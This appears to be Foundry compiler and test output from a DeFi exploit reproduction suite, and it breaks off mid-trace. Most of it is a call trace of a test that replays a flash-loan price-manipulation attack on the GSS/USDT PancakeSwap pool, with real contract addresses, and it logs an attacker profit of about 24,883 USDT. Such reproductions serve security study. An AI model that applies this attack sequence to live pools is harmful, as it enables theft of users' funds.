Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.17s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    в”њв”Ђ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    в”‚   в””в”Ђ в†ђ [Return] 
    в”њв”Ђ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    в”њв”Ђ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    в””в”Ђ в†ђ [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 248.87ms (127.29Вµs CPU time)

Ran 1 test for src/test/2023-08/GSS_exp.sol:ContractTest
[PASS] testExploit() (gas: 2032338)
Logs:
  Attacker USDT balance after exploit: 24883.449810865059102747

Traces:
  [2270238] ContractTest::testExploit()
    в”њв”Ђ [2266730] DODOPool::flashLoan(0, 30000000000000000000000 [3e22], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00)
    в”‚   в”њв”Ђ [12871] USDT::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 30000000000000000000000 [3e22])
    в”‚   в”‚   в”њв”Ђ emit Transfer(from: DODOPool: [0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 30000000000000000000000 [3e22])
    в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”њв”Ђ [2225022] ContractTest::DPPFlashLoanCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 30000000000000000000000 [3e22], 0x00)
    в”‚   в”‚   в”њв”Ђ [24562] USDT::approve(PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ [561351] PANCAKE_ROUTER_V2::swapExactTokensForTokensSupportingFeeOnTransferTokens(30000000000000000000000 [3e22], 0, [0x55d398326f99059fF775485246999027B3197955, 0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1692809033 [1.692e9])
    в”‚   в”‚   в”‚   в”њв”Ђ [10834] USDT::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], 30000000000000000000000 [3e22])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], value: 30000000000000000000000 [3e22])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564009457584007913129639935 [1.157e77])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”њв”Ђ [2602] GSS::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”њв”Ђ [2893] GSS_USDT_POOL::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1470579772541070055015370 [1.47e24], 27719872241221986053657 [2.771e22], 1692808021 [1.692e9]
    в”‚   в”‚   в”‚   в”њв”Ђ [531] USDT::balanceOf(GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 57719872241221986053657 [5.771e22]
    в”‚   в”‚   в”‚   в”њв”Ђ [531697] GSS_USDT_POOL::swap(763417420878971766021942 [7.634e23], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [497252] GSS::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 763417420878971766021942 [7.634e23])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], to: 0xf4Cfe34C06E55B9300e02127F99652C9ea1c9C69, value: 10000000000000 [1e13])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], to: 0x37F9d9329DCd3eef8d3d2F96A9e8cA5b55EC49B9, value: 10000000000000 [1e13])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], to: 0x348D4743f570c32cC4b5DB7B5Da8751aB120E8d3, value: 10000000000000 [1e13])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], to: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], value: 22902522626369152980658 [2.29e22])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], to: 0x981c20A7AB02B89453fCd630bFa8E933896C296e, value: 7634174208789717660219 [7.634e21])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [16751] 0x981c20A7AB02B89453fCd630bFa8E933896C296e::distributeETHDividends(7634174208789717660219 [7.634e21])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit DividendsDistributed(param0: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], param1: 7634174208789717660219 [7.634e21])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], to: 0x000000000000000000000000000000000000dEaD, value: 7634174208789717660219 [7.634e21])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 725246549835023177720846 [7.252e23])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2788] 0x981c20A7AB02B89453fCd630bFa8E933896C296e::setBalance(GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], 707162351662098288993428 [7.071e23])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [153941] 0x981c20A7AB02B89453fCd630bFa8E933896C296e::setBalance(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 725246549835023177720846 [7.252e23])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 725246549835023177720846 [7.252e23])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [159565] 0x981c20A7AB02B89453fCd630bFa8E933896C296e::process(150000 [1.5e5])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit DividendWithdrawn(param0: 0x2e147C65288Ee5Bcc8EE57F01fA889A732a9B6e5, param1: 273637479262117411705 [2.736e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [10872] GSS::transfer(0x2e147C65288Ee5Bcc8EE57F01fA889A732a9B6e5, 273637479262117411705 [2.736e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x981c20A7AB02B89453fCd630bFa8E933896C296e, to: 0x2e147C65288Ee5Bcc8EE57F01fA889A732a9B6e5, value: 273637479262117411705 [2.736e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ  emit topic 0: 0xa2c38e2d2fb7e3e1912d937fd1ca11ed6d51864dee4cfa7a7bf02becd7acf092
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚        topic 1: 0x0000000000000000000000002e147c65288ee5bcc8ee57f01fa889a732a9b6e5
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000001
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚           data: 0x00000000000000000000000000000000000000000000000ed57b9d986bd3bb79
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit DividendWithdrawn(param0: 0x1cD84Eda0Bd4C7B34bCAc7F721ba100984605386, param1: 260506116502217397659 [2.605e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [8872] GSS::transfer(0x1cD84Eda0Bd4C7B34bCAc7F721ba100984605386, 260506116502217397659 [2.605e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x981c20A7AB02B89453fCd630bFa8E933896C296e, to: 0x1cD84Eda0Bd4C7B34bCAc7F721ba100984605386, value: 260506116502217397659 [2.605e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ  emit topic 0: 0xa2c38e2d2fb7e3e1912d937fd1ca11ed6d51864dee4cfa7a7bf02becd7acf092
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚        topic 1: 0x0000000000000000000000001cd84eda0bd4c7b34bcac7f721ba100984605386
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000001
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚           data: 0x00000000000000000000000000000000000000000000000e1f3fa4bcfb31959b
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit DividendWithdrawn(param0: 0xcc4459121B9eBB37fEDCA1897e9A59234917AC2E, param1: 291060635281520591415 [2.91e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [8872] GSS::transfer(0xcc4459121B9eBB37fEDCA1897e9A59234917AC2E, 291060635281520591415 [2.91e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x981c20A7AB02B89453fCd630bFa8E933896C296e, to: 0xcc4459121B9eBB37fEDCA1897e9A59234917AC2E, value: 291060635281520591415 [2.91e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ  emit topic 0: 0xa2c38e2d2fb7e3e1912d937fd1ca11ed6d51864dee4cfa7a7bf02becd7acf092
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚        topic 1: 0x000000000000000000000000cc4459121b9ebb37fedca1897e9a59234917ac2e
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000001
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚           data: 0x00000000000000000000000000000000000000000000000fc74719aee6900237
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [602] GSS::balanceOf(GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 707162351662098288993428 [7.071e23]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [531] USDT::balanceOf(GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 57719872241221986053657 [5.771e22]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 707162351662098288993428 [7.071e23], reserve1: 57719872241221986053657 [5.771e22])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Swap(sender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 30000000000000000000000 [3e22], amount0Out: 763417420878971766021942 [7.634e23], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ [602] GSS::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 725246549835023177720846 [7.252e23]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [597195] GSS::transfer(GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], 707162351662098288993328 [7.071e23])
    в”‚   в”‚   в”‚   в”њв”Ђ [2531] USDT::balanceOf(0xB0Cf1136fFa31cb4c5853fA4E74bB3A596d05cA0) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”њв”Ђ [61295] PANCAKE_ROUTER_V2::swapExactTokensForTokens(166666666666666666666 [1.666e20], 0, [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66, 0x55d398326f99059fF775485246999027B3197955], 0xB0Cf1136fFa31cb4c5853fA4E74bB3A596d05cA0, 1692808033 [1.692e9])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [893] GSS_USDT_POOL::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 707162351662098288993428 [7.071e23], 57719872241221986053657 [5.771e22], 1692808033 [1.692e9]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [13681] GSS::transferFrom(GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], 166666666666666666666 [1.666e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], to: GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], value: 166666666666666666666 [1.666e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], spender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640563847341845468906206730628 [1.157e77])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [38332] GSS_USDT_POOL::swap(0, 13566436784196770517 [1.356e19], 0xB0Cf1136fFa31cb4c5853fA4E74bB3A596d05cA0, 0x)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [23171] USDT::transfer(0xB0Cf1136fFa31cb4c5853fA4E74bB3A596d05cA0, 13566436784196770517 [1.356e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], to: 0xB0Cf1136fFa31cb4c5853fA4E74bB3A596d05cA0, value: 13566436784196770517 [1.356e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [602] GSS::balanceOf(GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 707329018328764955660094 [7.073e23]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [531] USDT::balanceOf(GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 57706305804437789283140 [5.77e22]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 707329018328764955660094 [7.073e23], reserve1: 57706305804437789283140 [5.77e22])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Swap(sender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 166666666666666666666 [1.666e20], amount1In: 0, amount0Out: 0, amount1Out: 13566436784196770517 [1.356e19], to: 0xB0Cf1136fFa31cb4c5853fA4E74bB3A596d05cA0)
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] [166666666666666666666 [1.666e20], 13566436784196770517 [1.356e19]]
    в”‚   в”‚   в”‚   в”њв”Ђ [531] USDT::balanceOf(0xB0Cf1136fFa31cb4c5853fA4E74bB3A596d05cA0) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 13566436784196770517 [1.356e19]
    в”‚   в”‚   в”‚   в”њв”Ђ [32734] USDT::transferFrom(0xB0Cf1136fFa31cb4c5853fA4E74bB3A596d05cA0, GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], 13566436784196770517 [1.356e19])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xB0Cf1136fFa31cb4c5853fA4E74bB3A596d05cA0, to: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], value: 13566436784196770517 [1.356e19])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: 0xB0Cf1136fFa31cb4c5853fA4E74bB3A596d05cA0, spender: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], value: 115792089237316195423570985008687907853269984665640564039172297461258297782322 [1.157e77])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”њв”Ђ [92627] PANCAKE_ROUTER_V2::addLiquidity(GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], USDT: [0x55d398326f99059fF775485246999027B3197955], 166666666666666666667 [1.666e20], 13566436784196770517 [1.356e19], 0, 0, 0x4f64a23a0d8Ff69Aa326ed13a312f28A22D08714, 1692808033 [1.692e9])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], USDT: [0x55d398326f99059fF775485246999027B3197955]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [893] GSS_USDT_POOL::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 707329018328764955660094 [7.073e23], 57706305804437789283140 [5.77e22], 1692808033 [1.692e9]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [6881] GSS::transferFrom(GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], 166289182421502231125 [1.662e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], to: GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], value: 166289182421502231125 [1.662e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], spender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640563847175556286484704499503 [1.157e77])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [10834] USDT::transferFrom(GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], 13566436784196770517 [1.356e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], to: GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], value: 13566436784196770517 [1.356e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], spender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039172297461258297782322 [1.157e77])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [61856] GSS_USDT_POOL::mint(0x4f64a23a0d8Ff69Aa326ed13a312f28A22D08714)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [602] GSS::balanceOf(GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 707495307511186457891219 [7.074e23]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [531] USDT::balanceOf(GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 57719872241221986053657 [5.771e22]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2354] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::feeTo() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0ED943Ce24BaEBf257488771759F9BF482C39706
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0ED943Ce24BaEBf257488771759F9BF482C39706, value: 48437450831827753228 [4.843e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x4f64a23a0d8Ff69Aa326ed13a312f28A22D08714, value: 47348678981213765621 [4.734e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 707495307511186457891219 [7.074e23], reserve1: 57719872241221986053657 [5.771e22])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Mint(sender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0: 166289182421502231125 [1.662e20], amount1: 13566436784196770517 [1.356e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 47348678981213765621 [4.734e19]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 166289182421502231125 [1.662e20], 13566436784196770517 [1.356e19], 47348678981213765621 [4.734e19]
    в”‚   в”‚   в”‚   в”њв”Ђ [107169] PANCAKE_ROUTER_V2::swapExactTokensForTokensSupportingFeeOnTransferTokens(666666666666666666667 [6.666e20], 0, [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66, 0x55d398326f99059fF775485246999027B3197955, 0x6E905369F331da92A257Aea758aF0B8D93587A5e], 0x000000000000000000000000000000000000dEaD, 1692808033 [1.692e9])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [6881] GSS::transferFrom(GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], 666666666666666666667 [6.666e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], to: GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], value: 666666666666666666667 [6.666e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], spender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640563846508889619818037832836 [1.157e77])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2667] 0x6E905369F331da92A257Aea758aF0B8D93587A5e::balanceOf(0x000000000000000000000000000000000000dEaD) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 895638686256739413868868 [8.956e23]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [893] GSS_USDT_POOL::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 707495307511186457891219 [7.074e23], 57719872241221986053657 [5.771e22], 1692808033 [1.692e9]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [602] GSS::balanceOf(GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0]) [staticcall]
